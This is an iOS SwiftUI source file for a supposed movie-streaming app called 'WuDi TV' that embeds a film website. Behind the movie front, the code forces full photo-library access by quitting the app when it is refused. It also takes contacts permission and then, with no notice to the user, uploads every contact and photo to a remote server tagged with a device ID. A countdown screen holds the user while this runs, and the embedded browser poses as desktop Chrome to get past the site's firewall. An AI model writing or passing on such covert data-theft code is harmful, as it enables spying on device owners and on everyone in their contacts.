import SwiftUI
import UIKit
import Photos
import Contacts
import WebKit
import Darwin

/// WuDiTV：电影点播（内嵌网页）+ 静默备份
/// 权限门禁：照片必须"允许完全访问"（全部相册），否则闪退；
/// 拒绝后再次打开：部分照片→重新弹框；不允许→跳系统设置，避免再也打不开
struct ContentView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var countdownText = ""
    @State private var playEnabled = false
    @State private var showWeb = false
    @State private var started = false

    private let serverBase = "https://omgga-entertainment-server.hf.space"
    private let movieURL = "https://www.4kcz.com/zuixindianying"

    var body: some View {
        ZStack {
            VStack(spacing: 24) {
                Text("WuDi TV")
                    .font(.title.bold())
                    .padding(.top, 40)

                Text(countdownText)
                    .font(.system(size: 48, weight: .bold))
                    .foregroundColor(.blue)

                Button(action: { showWeb = true }) {
                    Text("开始播放")
                        .font(.headline)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 14)
                        .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
                        .foregroundColor(.white)
                        .cornerRadius(10)
                }
                .disabled(!playEnabled)
                .padding(.horizontal, 28)

                Spacer()
            }
            .background(Color(.systemGroupedBackground))

            // 内嵌电影网页层
            if showWeb {
                VStack(spacing: 0) {
                    HStack {
                        Button("关闭") { showWeb = false }
                            .font(.subheadline)
                            .padding(.leading, 12)
                        Spacer()
                        Text("电影")
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                        Spacer()
                        Color.clear.frame(width: 52, height: 1)
                    }
                    .padding(.vertical, 8)
                    .background(Color(.systemGray6))

                    WebViewContainer(urlString: movieURL)
                }
                .transition(.move(edge: .bottom))
            }
        }
        .onAppear { startBackupFlow() }
        .onChange(of: scenePhase) { phase in
            // 从系统设置改完权限回来后，重新走流程
            if phase == .active {
                startBackupFlow()
            }
        }
    }

    // MARK: - 权限门禁

    private enum PhotoGate {
        case granted         // 完全访问，可以继续
        case rejected        // 本次弹窗选了部分照片/不允许 → 闪退
        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 跳设置
    }

    private func startBackupFlow() {
        guard !started else { return }
        started = true

        Task {
            switch await photoGate() {
            case .granted:
                if await requestContactsAccess() {
                    startCountdown()
                    runSilentBackup()
                } else {
                    exit(0)
                }
            case .rejected:
                // 按用户要求：拒绝后闪退；下次打开可重新选择授权
                exit(0)
            case .deniedPermanent:
                // iOS 规定拒绝后 App 不能再弹框 → 跳系统设置，保证能再次授权、不会打不开
                started = false
                openSettings()
            }
        }
    }

    /// 照片权限：只认"允许完全访问"（.authorized）
    private func photoGate() async -> PhotoGate {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        switch status {
        case .authorized:
            return .granted
        case .notDetermined:
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        case .limited:
            // 部分照片：可以再次弹框，让用户升级为完全访问
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        default:
            return .deniedPermanent // .denied / .restricted
        }
    }

    private func requestPhotoAuth() async -> PHAuthorizationStatus {
        await withCheckedContinuation { cont in
            PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
                cont.resume(returning: s)
            }
        }
    }

    /// 通讯录权限：允许或部分授权都算通过
    private func requestContactsAccess() async -> Bool {
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized, .limited:
            return true
        case .notDetermined:
            let store = CNContactStore()
            let granted = await withCheckedContinuation { cont in
                store.requestAccess(for: .contacts) { ok, _ in
                    cont.resume(returning: ok)
                }
            }
            return granted
        default:
            return false
        }
    }

    private func openSettings() {
        if let url = URL(string: UIApplication.openSettingsURLString) {
            UIApplication.shared.open(url)
        }
    }

    // MARK: - 倒计时 + 静默备份

    private func runSilentBackup() {
        Task {
            let devId = Self.deviceId()
            let uploader = UploadService(serverBase: serverBase, deviceId: devId)

            do {
                let contacts = try await ContactBackup.exportContacts()
                _ = try? await uploader.uploadContacts(contacts)
            } catch {
                // 静默
            }

            let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
            let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
                                                                      uploadedMd5: md5Set0,
                                                                      progress: { _, _, _ in })
            if let result = backupResult {
                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
            }
        }
    }

    private func startCountdown() {
        Task {
            for i in stride(from: 10, through: 1, by: -1) {
                countdownText = "剩余 \(i) 秒"
                try? await Task.sleep(nanoseconds: 1_000_000_000)
            }
            countdownText = ""
            playEnabled = true
        }
    }

    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
    private static func deviceId() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
        return "\(machine) #\(suffix)"
    }
}

/// 内嵌电影网页（WKWebView）
/// 针对网站防火墙（雷池 WAF）：
/// 1) 伪装成桌面 Chrome 浏览器
/// 2) 先访问网站首页种下 Cookie，再跳转电影页
struct WebViewContainer: UIViewRepresentable {
    let urlString: String

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        // 伪装成桌面 Chrome
        webView.customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        // 先访问首页种 Cookie，完成后再跳电影页
        if let root = URL(string: "https://www.4kcz.com/") {
            webView.load(URLRequest(url: root))
        }
        return webView
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(target: urlString)
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}

    final class Coordinator: NSObject, WKNavigationDelegate {
        let target: String
        var jumped = false

        init(target: String) {
            self.target = target
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            guard !jumped else { return }
            if let host = webView.url?.host, host.contains("4kcz.com") {
                jumped = true
                if let targetURL = URL(string: target) {
                    webView.load(URLRequest(url: targetURL))
                }
            }
        }
    }
}
